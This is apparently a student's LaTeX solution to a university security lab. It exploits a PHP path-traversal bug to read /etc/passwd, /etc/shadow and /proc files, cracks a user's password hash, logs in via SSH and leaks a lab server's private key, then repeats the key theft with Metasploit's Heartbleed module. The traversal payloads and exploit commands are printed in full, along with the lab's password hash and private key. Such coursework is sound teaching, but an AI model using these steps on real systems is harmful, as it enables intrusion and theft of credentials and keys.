@@ -1,0 +1,494 @@
+% IMPORTANT: add or remove (comment out) the boolean '\solutiontrue' below to
+% create the solution document or the exercise document respectively.
+% First we create the switch to make either the exercises or the solutions
+\newif\ifsolution\solutionfalse
+% To create the solution uncomment '\solutiontrue'
+\solutiontrue
+
+\documentclass[a4paper,11pt]{article}
+
+\title{System Security\\
+Exploits}
+
+\ifsolution
+\author{Siddhant Ray}
+\fi
+
+\ifsolution
+\author{\bf Solution : Siddhant Ray}
+\else
+\author{\bf Graded Assignment}
+\fi
+
+\usepackage[T1]{fontenc}
+\usepackage{ae, aecompl}
+\usepackage{a4wide}
+\usepackage{boxedminipage}
+\usepackage{graphicx}
+\usepackage{subfigure}
+\usepackage{enumerate}
+\usepackage{url}
+\usepackage{listings}
+\usepackage{comment}
+\usepackage{bibentry}
+\usepackage{hyperref}
+
+\ifsolution\includecomment{final}
+\else\excludecomment{final}\fi
+
+% ------------ Listings Settings
+\lstset{%
+  basicstyle=\small\ttfamily,
+  frame=none,
+  framexleftmargin=0pt,
+  captionpos=b,
+  showspaces=false,
+  showstringspaces=false,
+  showtabs=false,         
+  tabsize=4,
+  breaklines=true,
+  breakatwhitespace=false}
+
+% Some useful commands and environments
+\usepackage{framed}
+\newenvironment{solution}%
+{\par{\noindent\small\textit{Solution:}}\vspace{-12pt}\begin{framed}}%
+{\end{framed}\par}
+
+\begin{document}
+\maketitle
+
+\section{Manual Exploit}
+
+\begin{enumerate}
+	\item The OWASP Top 10 ``represents a broad consensus about the most critical security risks to web applications''. It is a very popular list of vulnerable patterns for web security. Consult the 2017 list here: \url{https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_(en).pdf.pdf}.
+	
+	Check the source code of our vulnerable website. Do you see any potential vulnerability that allows us to read any arbitrary file on the remote filesystem? For example, a value controlled by the user that is used without checks from a function that reads files. What OWASP Top 10 category would you classify it as?
+	
+	\ifsolution\begin{solution}
+WRITE HERE.
+\begin{verbatim}
+<?php
+        $comic = isset($_GET['comic'])
+            ? $_GET['comic']
+            : 'bobby.jpg';
+        $content = base64_encode(file_get_contents("img/" . $comic));
+        echo "<img src='data:image/jpg;base64, $content' />";
+    ?>
+\end{verbatim}
+
+There is a serious problem in this section of the PHP code. As there is no validation of which file can be passed using the argument in $\$\_GET$, the file bobby.jpg can be replaced by any file in the system. Hence, we can modify the PHP code, and pass the file of our choice to 'comic'=../../../../../../../<file>. This will work, as the current user has permission to go as behind in the directory as possible, after a point, the user will end up in the base directory, from where one can go to any file of choice in this case. The problem here in terms of categorization is access control and injection attacks. A user should not be able to access all directories by replacing a file path in a web server's source code, there should be a way to prevent against such an injection attack.
+
+\end{solution}\fi
+
+
+	\item Try to read some filesystem files that you are not supposed to. How do you get them exfiltrated thanks to the previous vulnerability?
+	
+	Let's get some interesting files. How many users are there in the system? How can you tell by just being able to read files? How many users can log in into the system?
+	
+	\ifsolution\begin{solution}
+WRITE HERE. 
+
+We can pass the files we want as the 'comic' parameter in the PHP code, as there is no access control for the files we can access. Two nice files which we can access are /etc/passwd which contains all the users, and /etc/shadow which contains the hashes of the passwords. We use 'comic'=../../../../../../../etc/passwd or 'comic'=../../../../../../../etc/shadow.
+
+/etc/passwd has the following content:
+\begin{verbatim}
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+gullible:x:1000:1000::/home/gullible:/bin/sh
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+\end{verbatim}
+
+This shows that there are \textbf{22 users} in the system. 
+
+/etc/shadow has the following content:
+\begin{verbatim}
+root:*:16156:0:99999:7:::
+daemon:*:16156:0:99999:7:::
+bin:*:16156:0:99999:7:::
+sys:*:16156:0:99999:7:::
+sync:*:16156:0:99999:7:::
+games:*:16156:0:99999:7:::
+man:*:16156:0:99999:7:::
+lp:*:16156:0:99999:7:::
+mail:*:16156:0:99999:7:::
+news:*:16156:0:99999:7:::
+uucp:*:16156:0:99999:7:::
+proxy:*:16156:0:99999:7:::
+www-data:*:16156:0:99999:7:::
+backup:*:16156:0:99999:7:::
+list:*:16156:0:99999:7:::
+irc:*:16156:0:99999:7:::
+gnats:*:16156:0:99999:7:::
+nobody:*:16156:0:99999:7:::
+libuuid:!:16156:0:99999:7:::
+syslog:*:16156:0:99999:7:::
+gullible:$6$otfLedCx$Bgv4EoVV64KsixpcFqoT79fwoSFIKpoSGtFq0cuZJiUhcnuVG
+ccbhCloIwXezcQ96aniNLmtXo31GIAr/XIdH0:18928:0:99999:7:::
+sshd:*:18928:0:99999:7:::
+\end{verbatim}
+This shows that there is \textbf{1 user} with a password which can log into the system, and for our exploit, gullible is the user we can target for an attack.
+
+\end{solution}\fi
+
+	\item Let's try to get the target file. Does it work? Why not? Can we discover who we are running as? (\textit{Hint: some files in \texttt{/proc/self} might help you -- consult the \texttt{proc} documentation by checking its manpages}).
+	
+	\ifsolution\begin{solution}
+WRITE HERE. 
+
+We cannot get the target file /usr/lib/ssl/private/secret.crt as it cannot be accessed by the current user logged in to the system, as he/she doesn't have sudo privileges. However, we can find the current user we are running as. We pass the following 'comic' = ../../../../../../../proc/self/status, where the status file will tell us, which user is currently running, by showing the uid field.
+
+\begin{verbatim}
+Name:	apache2
+Umask:	0022
+State:	R (running)
+Tgid:	22
+Ngid:	0
+Pid:	22
+PPid:	16
+TracerPid:	0
+Uid:	33	33	33	33
+Gid:	33	33	33	33
+FDSize:	64
+Groups:	33 
+NStgid:	22
+NSpid:	22
+NSpgid:	16
+NSsid:	16
+VmPeak:	   23768 kB
+VmSize:	   23764 kB
+VmLck:	       0 kB
+VmPin:	       0 kB
+VmHWM:	    9028 kB
+VmRSS:	    9028 kB
+RssAnon:	    2784 kB
+RssFile:	    6128 kB
+RssShmem:	     116 kB
+VmData:	    5196 kB
+\end{verbatim}
+We see that the \textbf{uid running currently is 33}, and when we correlate that to the data from /etc/passwd, we see that number 33 belongs to the \textbf{user www-data}.
+\end{solution}\fi
+
+\item There is a big misconfiguration in the server that allows us to get the (hashed) Unix user passwords. What is this misconfiguration? How many users have a password?
+
+Let's crack the user password: use the tool \textit{John The Ripper} to crack it. To use John, you need a \textit{dictionary} of passwords that it can try to hash and compare to the target hash.
+You can start with an English dictionary of words, for example \url{https://raw.githubusercontent.com/dwyl/english-words/master/words_alpha.txt}, otherwise, you can use popular password leaks such as \textit{rockyou.txt}, or other dictionaries. What is the user's password?
+	
+\ifsolution\begin{solution}
+On this system, the vulnerability due to the web server, helps us access the shadow file. The shadow file can clearly tell us which users have a password, as it stores the hashes of the password. Below is the contents of the shadow file:
+\begin{verbatim}
+root:*:16156:0:99999:7:::
+daemon:*:16156:0:99999:7:::
+bin:*:16156:0:99999:7:::
+sys:*:16156:0:99999:7:::
+sync:*:16156:0:99999:7:::
+games:*:16156:0:99999:7:::
+man:*:16156:0:99999:7:::
+lp:*:16156:0:99999:7:::
+mail:*:16156:0:99999:7:::
+news:*:16156:0:99999:7:::
+uucp:*:16156:0:99999:7:::
+proxy:*:16156:0:99999:7:::
+www-data:*:16156:0:99999:7:::
+backup:*:16156:0:99999:7:::
+list:*:16156:0:99999:7:::
+irc:*:16156:0:99999:7:::
+gnats:*:16156:0:99999:7:::
+nobody:*:16156:0:99999:7:::
+libuuid:!:16156:0:99999:7:::
+syslog:*:16156:0:99999:7:::
+gullible:$6$otfLedCx$Bgv4EoVV64KsixpcFqoT79fwoSFIKpoSGtFq0cuZJiUhcnuVG
+ccbhCloIwXezcQ96aniNLmtXo31GIAr/XIdH0:18928:0:99999:7:::
+sshd:*:18928:0:99999:7:::
+\end{verbatim}
+From observation, we can see that the user gullible has the hash of the password stored, after the second \$ sign in the entry of gullible, the hash of password is stored.
+
+John the Ripper gives: password = invulnerable 
+\end{solution}\fi
+
+\item Let's see if we can use our new knowledge: use \texttt{nmap} to see how many open ports the server has. \textit{Note: for the sake of demo, all ports of the server are remapped in the 8000 range, so the \texttt{HTTPs} port 443 is exposed here as 8443, and in general, port XYZ would be exposed as 8XYZ.} What command do you have to issue? What is the other exposed service, besides the webserver?
+
+\ifsolution\begin{solution}
+WRITE HERE.
+
+We can use the nmap command~\cite{web4} here to check the port mappings, which will show us which ports are running. The command is nmap -p 8000:9000 localhost, which shows all ports in the range 8000-9000. We see the following result :
+\begin{verbatim}
+PORT     STATE SERVICE
+8022/tcp open  oa-system
+8443/tcp open  https-alt
+\end{verbatim}
+
+We see that port 8022 is open, and from the remapping, we know that 8022 corresponds to the port 22, which is the SSH port. We can now use the SSH port, to login with the user gullible, as we know his/her password.
+\end{solution}\fi
+
+	\item Login as the user in the system. Can you get the target file? What groups are you part of -- is there any interesting group? You should be able to get the target file -- and control the full system! What is the SSL certificate of the server?
+	
+	\ifsolution\begin{solution}
+WRITE HERE.
+
+The user gullible is part of the superuser group, which we can check after SSH login with ssh gullible@localhost -p 22, using the groups command. Now we can go into sudo mode and access the target file, /usr/lib/ssl/private/secret.crt.
+
+The SSL certificate is (private key):
+\begin{verbatim}
+-----BEGIN PRIVATE KEY-----
+MIIEogIBAAKCAQEA3FknF1R+zm3sPWZgD07cdn6AEwDYFh8uepErGw5Gp/lGNhME
+rPkQjjL+W07Nf7yjkXi4bkdqrh8YueqM6Z5XfOZpOn07scMvvJ3jyWiJRZTu/9Sc
+JtmKEunRwBDSunfKNW1TzHSyO1pHaV9gf4V6A0Yc+geH7jNIkIa+nVMk/+o468Ku
+ZVGZNFbEYuYEnZx1gFwIIIQ22UryqaGkD9/ufKsLH11bvlsjbtILbU7uauFH2hDR
+eIcymoB180SVHjYgnEW7QX6FNXHsO+ZH04eHtDW/7XGSmgbCFRsb+y3v8FeipJ58
+zfdUqi2NFKUdE/9eQPYlPRYPW6EP5TEY5nxjvQIDAQABAoIBAHg+3qpInfqg2e6X
+04wHCSBQ4Ct+pm1MDt0sI03ceIpp6frQXhjWwkYXZd8GHfa7Rre4HU1xA7KJncC3
+UraahjvOsVYNyWm0jnRr5UagGWkzYUmTCLPauxKfLquVgqnnfR2yz6wfcrQZDCdg
+uRReDruCo4V+XpuKuOrF3XeVS/erIrP3nSGiDh8ax3Y3Jwxk6FXylL4k13SW+BXx
+Coe8IJNRDM6uc/x8scCeVmjbC73xZaT1sMOL1NPvErriHmBYDo3lAqTMp2QG0bCh
+J7RKau0YYsseMrkzL/1xpNZtTNvHbElvA4sOMTCZXwlKieBAQ9zkdXPgdJVG+G98
+6RDFKbECgYEA7iTMxvxjRcvhLRVr95nbyXa1nd1L4XjwMRTMd2io4C8eoHCZeuoi
+CY/hwv5vDDd9wKWuD21r6PEVf5mTdpEoP6l2t6C8VBEbMR31Vh+iR9hDS6+4b6K4
+hHH0e95ei94bKwJg/5w/6uPwE7djtEVsHQqxxsAsyhZ3ygydob+EWQcCgYEA7N7E
+E36VKsVOk193uPuJF4CYgl2biE1/STSQOY+Lv146unQpEuK0v0xIvA4zttg3RAue
+TO3XHKdbZV8u5C5ZrQZAxA043u8nMHSXH2r7neP/ZYcZq8ZUu1PxUx7FO0qVDgDu
+g7x0lYEakviS2F3OdxbiSYbcjfvAaN/IHbGBABsCgYBkb7DN23Qi47G8SeSXMJS5
+iw9d3Q87sL3cdWEmm0VeB4FrORIB/O0OC1iz3IsJI/4tWbLnXsa8H7Fpd2PyBZZs
+AxTGrUvASNanCHOINx9CHbuEGEA5FO+tLEJoW4iUhMAAi6hNJaDvd+Kw7g9m4ECQ
+nwoLQNGjCYbL+DYjGZq/0QKBgBZhNcVhwFY6LiJecsFXgqxlygMHNRq7t7sC7F2D
+4oBCNupG71qJcOpiGr0p2lj8NLyJHHvIPPrIFSqOw69rca2XWacsWKM3lUxOt7iQ
+MxXH5OmCyjogkwDf/X0M+zWO5mZcUCzCMYGuoQQh2D35HvjBgL/RriT8FEHUYuPr
+UXThAoGALS7JYPwbTIMWnTtBrucK35GqLwEzh0yhbZgYRABirn99bVnL3YAl4+5o
+2z3auU9bKjvZsG+sA892WWK3oLVVDzfo9zmD9FPy9By/NGHvY7Bl11vSwdGRLjth
+SHOjAdbyi+onLsq6oJRMm7fuJw3kIA92zaSLvnR0lGQOnoYoa9Y=
+-----END PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIICuDCCAaCgAwIBAgIJAPnDDyMX2dVqMA0GCSqGSIb3DQEBBQUAMBQxEjAQBgNV
+BAMTCWxvY2FsaG9zdDAeFw0xOTA5MzAwOTE3NDNaFw0yOTA5MjcwOTE3NDNaMBQx
+EjAQBgNVBAMTCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+ggEBANxZJxdUfs5t7D1mYA9O3HZ+gBMA2BYfLnqRKxsORqf5RjYTBKz5EI4y/ltO
+zX+8o5F4uG5Haq4fGLnqjOmeV3zmaTp9O7HDL7yd48loiUWU7v/UnCbZihLp0cAQ
+0rp3yjVtU8x0sjtaR2lfYH+FegNGHPoHh+4zSJCGvp1TJP/qOOvCrmVRmTRWxGLm
+BJ2cdYBcCCCENtlK8qmhpA/f7nyrCx9dW75bI27SC21O7mrhR9oQ0XiHMpqAdfNE
+lR42IJxFu0F+hTVx7DvmR9OHh7Q1v+1xkpoGwhUbG/st7/BXoqSefM33VKotjRSl
+HRP/XkD2JT0WD1uhD+UxGOZ8Y70CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG
+9w0BAQUFAAOCAQEAJl2ic+jXBVfTsJe4flIQuuaRz/iXUqDGLMwYhcHfpjqw15cx
+cN2jMg19Hb27e4MoLi8FPQP5+CrKxNpdFVjfTsTxeESzlNcxYhX6tKTF2klBApPP
+R2MyWr2yBApPvJftKWpq4Qm7mAPwOZD/6BmDXsUWyFradn0/iS9b0F2rf1Ex6RTb
+Uyi76QT6sIkkJBO5VUn4H6O3LrwJARQn96meWrBOi8yB2BltwuyCRsD5RPvhN4ZB
+g5eltdAf0sUkL/QZ3hgZe/gs1biHK1E5z+ez7YNvf6Aj1No0zlFbswEtrmdMroTH
+LvTshhSZTFtsNgra8JiaMmoI0sOTbZpIoPJZBw==
+-----END CERTIFICATE----- 
+\end{verbatim}
+
+\end{solution}\fi
+	
+
+\end{enumerate}
+
+\section{Metasploit}
+We will now get to the same result using a shorter route.
+Instead of manual exploitation and code auditing, we will observe how once a big vulnerability is public domain, then anybody can exploit it. Hopefully, you will see why timely patching of software is important.
+
+We will use a popular penetration testing framework: \textit{Metasploit}. 
+Metasploit provides pre-made modules that allow testing and exploitation of popular vulnerabilities and misconfigurations.
+It is already installed in the VM, and its CLI can be accessed by typing \texttt{msfconsole} in a terminal.
+
+You can learn how to use the metasploit framework at
+\url{http://www.metasploit.com/}. Here are a few useful commands:
+\begin{itemize}
+	\item ``search application-name'' will give you all possible exploits
+	available for a given application. Try and understand which of them
+	best suit your requirements. There is plenty of help out there on
+	the Internet!
+	\item ``show actions'' lists the possible actions for the loaded module, while ``show options'' lists the information required for the exploit (e.g., target machine, port, etc.). You can then set actions and options with the \texttt{set} command.
+\end{itemize}
+
+Our target server is running a very old and unpatched Ubuntu GNU/Linux distribution from 2013.
+In particular, the OpenSSL version is \texttt{OpenSSL 1.0.1c 10 May 2012}.
+Check the known vulnerabilities of this version of OpenSSL, for example on the Common Vulnerabilities and Exploits (CVE) database.
+The CVE database provides a method of tracking all publicly known exploits and security issues of software, down to every version and release of software.
+Is there a very famous vulnerability known for this version of OpenSSL? Find the Metasploit module that can exploit it, and use it to get the private key. Is it the same key we leaked with the previous exploit? If not, why?
+
+\ifsolution\begin{solution}
+WRITE HERE.
+
+There is a famous vulnerability for this OpenSSL version, which leaks data from memory when requests of fake lengths are made. This is the heartbleed bug in the version of OpenSSL and the Metasploit for heartbleed, can be used to get the private key. Heartbleed allows an attacker to read the memory of systems using certain versions of OpenSSL, potentially allowing them to access usernames, password, or even the secret security keys of the server. Here are the steps used:
+
+\begin{verbatim}
+    msfconsole
+    search heartbleed
+    use auxiliary/scanner/ssl/openssl_heartbleed
+    set RHOSTS 172.17.0.2
+    set action KEYS
+    set verbose true 
+    exploit
+\end{verbatim}
+The key obtained is :
+\begin{verbatim}
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA3FknF1R+zm3sPWZgD07cdn6AEwDYFh8uepErGw5Gp/lGNhME
+rPkQjjL+W07Nf7yjkXi4bkdqrh8YueqM6Z5XfOZpOn07scMvvJ3jyWiJRZTu/9Sc
+JtmKEunRwBDSunfKNW1TzHSyO1pHaV9gf4V6A0Yc+geH7jNIkIa+nVMk/+o468Ku
+ZVGZNFbEYuYEnZx1gFwIIIQ22UryqaGkD9/ufKsLH11bvlsjbtILbU7uauFH2hDR
+eIcymoB180SVHjYgnEW7QX6FNXHsO+ZH04eHtDW/7XGSmgbCFRsb+y3v8FeipJ58
+zfdUqi2NFKUdE/9eQPYlPRYPW6EP5TEY5nxjvQIDAQABAoIBAHg+3qpInfqg2e6X
+04wHCSBQ4Ct+pm1MDt0sI03ceIpp6frQXhjWwkYXZd8GHfa7Rre4HU1xA7KJncC3
+UraahjvOsVYNyWm0jnRr5UagGWkzYUmTCLPauxKfLquVgqnnfR2yz6wfcrQZDCdg
+uRReDruCo4V+XpuKuOrF3XeVS/erIrP3nSGiDh8ax3Y3Jwxk6FXylL4k13SW+BXx
+Coe8IJNRDM6uc/x8scCeVmjbC73xZaT1sMOL1NPvErriHmBYDo3lAqTMp2QG0bCh
+J7RKau0YYsseMrkzL/1xpNZtTNvHbElvA4sOMTCZXwlKieBAQ9zkdXPgdJVG+G98
+6RDFKbECgYEA7N7EE36VKsVOk193uPuJF4CYgl2biE1/STSQOY+Lv146unQpEuK0
+v0xIvA4zttg3RAueTO3XHKdbZV8u5C5ZrQZAxA043u8nMHSXH2r7neP/ZYcZq8ZU
+u1PxUx7FO0qVDgDug7x0lYEakviS2F3OdxbiSYbcjfvAaN/IHbGBABsCgYEA7iTM
+xvxjRcvhLRVr95nbyXa1nd1L4XjwMRTMd2io4C8eoHCZeuoiCY/hwv5vDDd9wKWu
+D21r6PEVf5mTdpEoP6l2t6C8VBEbMR31Vh+iR9hDS6+4b6K4hHH0e95ei94bKwJg
+/5w/6uPwE7djtEVsHQqxxsAsyhZ3ygydob+EWQcCgYAWYTXFYcBWOi4iXnLBV4Ks
+ZcoDBzUau7e7Auxdg+KAQjbqRu9aiXDqYhq9KdpY/DS8iRx7yDz6yBUqjsOva3Gt
+l1mnLFijN5VMTre4kDMVx+Tpgso6IJMA3/19DPs1juZmXFAswjGBrqEEIdg9+R74
+wYC/0a4k/BRB1GLj61F04QKBgGRvsM3bdCLjsbxJ5JcwlLmLD13dDzuwvdx1YSab
+RV4HgWs5EgH87Q4LWLPciwkj/i1ZsudexrwfsWl3Y/IFlmwDFMatS8BI1qcIc4g3
+H0Idu4QYQDkU760sQmhbiJSEwACLqE0loO934rDuD2bgQJCfCgtA0aMJhsv4NiMZ
+mr/RAoGBAL/t1l3Djd8s/aWezmy0jV/RT7rCLMaY7cACE9Del3ClRokMyNb6xLQj
+jnzRA8t/0tZ6jbmQivhG5algHSFn3zcdVtfWEMmtKy0Wjld4pnnUOTf5z60mHQRc
+K38Y6HS/5o4izQ7rZ921qV7uqSJkaH/4QMv4TNjwNk2Qg8ietat0
+-----END RSA PRIVATE KEY-----
+\end{verbatim}
+
+The key is slightly different in appearance from the previous key, as the primes used for RSA in the keys, $p$ and $q$, which give $n = pq$ are in reverse order for both the keys. The exponents are also in reverse order. In our case, for the first key we have:
+\begin{verbatim}
+prime1:
+    00:ee:24:cc:c6:fc:63:45:cb:e1:2d:15:6b:f7:99:
+    db:c9:76:b5:9d:dd:4b:e1:78:f0:31:14:cc:77:68:
+    a8:e0:2f:1e:a0:70:99:7a:ea:22:09:8f:e1:c2:fe:
+    6f:0c:37:7d:c0:a5:ae:0f:6d:6b:e8:f1:15:7f:99:
+    93:76:91:28:3f:a9:76:b7:a0:bc:54:11:1b:31:1d:
+    f5:56:1f:a2:47:d8:43:4b:af:b8:6f:a2:b8:84:71:
+    f4:7b:de:5e:8b:de:1b:2b:02:60:ff:9c:3f:ea:e3:
+    f0:13:b7:63:b4:45:6c:1d:0a:b1:c6:c0:2c:ca:16:
+    77:ca:0c:9d:a1:bf:84:59:07
+prime2:
+    00:ec:de:c4:13:7e:95:2a:c5:4e:93:5f:77:b8:fb:
+    89:17:80:98:82:5d:9b:88:4d:7f:49:34:90:39:8f:
+    8b:bf:5e:3a:ba:74:29:12:e2:b4:bf:4c:48:bc:0e:
+    33:b6:d8:37:44:0b:9e:4c:ed:d7:1c:a7:5b:65:5f:
+    2e:e4:2e:59:ad:06:40:c4:0d:38:de:ef:27:30:74:
+    97:1f:6a:fb:9d:e3:ff:65:87:19:ab:c6:54:bb:53:
+    f1:53:1e:c5:3b:4a:95:0e:00:ee:83:bc:74:95:81:
+    1a:92:f8:92:d8:5d:ce:77:16:e2:49:86:dc:8d:fb:
+    c0:68:df:c8:1d:b1:81:00:1b
+exponent1:
+    64:6f:b0:cd:db:74:22:e3:b1:bc:49:e4:97:30:94:
+    b9:8b:0f:5d:dd:0f:3b:b0:bd:dc:75:61:26:9b:45:
+    5e:07:81:6b:39:12:01:fc:ed:0e:0b:58:b3:dc:8b:
+    09:23:fe:2d:59:b2:e7:5e:c6:bc:1f:b1:69:77:63:
+    f2:05:96:6c:03:14:c6:ad:4b:c0:48:d6:a7:08:73:
+    88:37:1f:42:1d:bb:84:18:40:39:14:ef:ad:2c:42:
+    68:5b:88:94:84:c0:00:8b:a8:4d:25:a0:ef:77:e2:
+    b0:ee:0f:66:e0:40:90:9f:0a:0b:40:d1:a3:09:86:
+    cb:f8:36:23:19:9a:bf:d1
+exponent2:
+    16:61:35:c5:61:c0:56:3a:2e:22:5e:72:c1:57:82:
+    ac:65:ca:03:07:35:1a:bb:b7:bb:02:ec:5d:83:e2:
+    80:42:36:ea:46:ef:5a:89:70:ea:62:1a:bd:29:da:
+    58:fc:34:bc:89:1c:7b:c8:3c:fa:c8:15:2a:8e:c3:
+    af:6b:71:ad:97:59:a7:2c:58:a3:37:95:4c:4e:b7:
+    b8:90:33:15:c7:e4:e9:82:ca:3a:20:93:00:df:fd:
+    7d:0c:fb:35:8e:e6:66:5c:50:2c:c2:31:81:ae:a1:
+    04:21:d8:3d:f9:1e:f8:c1:80:bf:d1:ae:24:fc:14:
+    41:d4:62:e3:eb:51:74:e1
+coefficient:
+    2d:2e:c9:60:fc:1b:4c:83:16:9d:3b:41:ae:e7:0a:
+    df:91:aa:2f:01:33:87:4c:a1:6d:98:18:44:00:62:
+    ae:7f:7d:6d:59:cb:dd:80:25:e3:ee:68:db:3d:da:
+    b9:4f:5b:2a:3b:d9:b0:6f:ac:03:cf:76:59:62:b7:
+    a0:b5:55:0f:37:e8:f7:39:83:f4:53:f2:f4:1c:bf:
+    34:61:ef:63:b0:65:d7:5b:d2:c1:d1:91:2e:3b:61:
+    48:73:a3:01:d6:f2:8b:ea:27:2e:ca:ba:a0:94:4c:
+    9b:b7:ee:27:0d:e4:20:0f:76:cd:a4:8b:be:74:74:
+    94:64:0e:9e:86:28:6b:d6
+\end{verbatim}
+For the second key, we have 
+\begin{verbatim}
+prime1:
+    00:ec:de:c4:13:7e:95:2a:c5:4e:93:5f:77:b8:fb:
+    89:17:80:98:82:5d:9b:88:4d:7f:49:34:90:39:8f:
+    8b:bf:5e:3a:ba:74:29:12:e2:b4:bf:4c:48:bc:0e:
+    33:b6:d8:37:44:0b:9e:4c:ed:d7:1c:a7:5b:65:5f:
+    2e:e4:2e:59:ad:06:40:c4:0d:38:de:ef:27:30:74:
+    97:1f:6a:fb:9d:e3:ff:65:87:19:ab:c6:54:bb:53:
+    f1:53:1e:c5:3b:4a:95:0e:00:ee:83:bc:74:95:81:
+    1a:92:f8:92:d8:5d:ce:77:16:e2:49:86:dc:8d:fb:
+    c0:68:df:c8:1d:b1:81:00:1b
+prime2:
+    00:ee:24:cc:c6:fc:63:45:cb:e1:2d:15:6b:f7:99:
+    db:c9:76:b5:9d:dd:4b:e1:78:f0:31:14:cc:77:68:
+    a8:e0:2f:1e:a0:70:99:7a:ea:22:09:8f:e1:c2:fe:
+    6f:0c:37:7d:c0:a5:ae:0f:6d:6b:e8:f1:15:7f:99:
+    93:76:91:28:3f:a9:76:b7:a0:bc:54:11:1b:31:1d:
+    f5:56:1f:a2:47:d8:43:4b:af:b8:6f:a2:b8:84:71:
+    f4:7b:de:5e:8b:de:1b:2b:02:60:ff:9c:3f:ea:e3:
+    f0:13:b7:63:b4:45:6c:1d:0a:b1:c6:c0:2c:ca:16:
+    77:ca:0c:9d:a1:bf:84:59:07
+exponent1:
+    16:61:35:c5:61:c0:56:3a:2e:22:5e:72:c1:57:82:
+    ac:65:ca:03:07:35:1a:bb:b7:bb:02:ec:5d:83:e2:
+    80:42:36:ea:46:ef:5a:89:70:ea:62:1a:bd:29:da:
+    58:fc:34:bc:89:1c:7b:c8:3c:fa:c8:15:2a:8e:c3:
+    af:6b:71:ad:97:59:a7:2c:58:a3:37:95:4c:4e:b7:
+    b8:90:33:15:c7:e4:e9:82:ca:3a:20:93:00:df:fd:
+    7d:0c:fb:35:8e:e6:66:5c:50:2c:c2:31:81:ae:a1:
+    04:21:d8:3d:f9:1e:f8:c1:80:bf:d1:ae:24:fc:14:
+    41:d4:62:e3:eb:51:74:e1
+exponent2:
+    64:6f:b0:cd:db:74:22:e3:b1:bc:49:e4:97:30:94:
+    b9:8b:0f:5d:dd:0f:3b:b0:bd:dc:75:61:26:9b:45:
+    5e:07:81:6b:39:12:01:fc:ed:0e:0b:58:b3:dc:8b:
+    09:23:fe:2d:59:b2:e7:5e:c6:bc:1f:b1:69:77:63:
+    f2:05:96:6c:03:14:c6:ad:4b:c0:48:d6:a7:08:73:
+    88:37:1f:42:1d:bb:84:18:40:39:14:ef:ad:2c:42:
+    68:5b:88:94:84:c0:00:8b:a8:4d:25:a0:ef:77:e2:
+    b0:ee:0f:66:e0:40:90:9f:0a:0b:40:d1:a3:09:86:
+    cb:f8:36:23:19:9a:bf:d1
+coefficient:
+    00:bf:ed:d6:5d:c3:8d:df:2c:fd:a5:9e:ce:6c:b4:
+    8d:5f:d1:4f:ba:c2:2c:c6:98:ed:c0:02:13:d0:de:
+    97:70:a5:46:89:0c:c8:d6:fa:c4:b4:23:8e:7c:d1:
+    03:cb:7f:d2:d6:7a:8d:b9:90:8a:f8:46:e5:a9:60:
+    1d:21:67:df:37:1d:56:d7:d6:10:c9:ad:2b:2d:16:
+    8e:57:78:a6:79:d4:39:37:f9:cf:ad:26:1d:04:5c:
+    2b:7f:18:e8:74:bf:e6:8e:22:cd:0e:eb:67:dd:b5:
+    a9:5e:ee:a9:22:64:68:7f:f8:40:cb:f8:4c:d8:f0:
+    36:4d:90:83:c8:9e:b5:ab:74   
+\end{verbatim}
+
+This is why the keys look different, and the reason for this is because in Metasploit's, \href{https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/scanner/ssl/openssl_heartbleed.rb}{SOURCE CODE}~\cite{web1} and they try to read out the factors from the leaked memory and then generate the encoding from those, (call to 'get\_factors' on line 594). Hence, if the order of the leaked primes is reversed, the encoding will be slightly different. Also, the headers are different, the secret.crt, the header is "BEGIN PRIVATE KEY", which is a different, older format. "BEGIN PRIVATE KEY" is in PKCS\#8 format and indicates that the key type is included in the key data itself. "BEGIN RSA PRIVATE KEY" is in PKCS\#1 format and is just an RSA key. It is essentially just the key object from PKCS\#8, but without the version or algorithm identifier in front.
+
+The keys in the end are the same, I used diffs to check the points od difference~\cite{web2} and verified the certificate~\cite{web3} hash with the keys, they are the same in both cases, given as
+\begin{verbatim}
+key hash = 0c4e62b3cda41c952442db3804532738695f734ccd6cbdc612752afe98f3a89f
+certificate hash = 0c4e62b3cda41c952442db3804532738695f734ccd6cbdc612752afe
+98f3a89f
+\end{verbatim}
+
+\end{solution}\fi
+
+\bibliographystyle{IEEEtran}
+\bibliography{refs}
+
+\end{document}
+
+
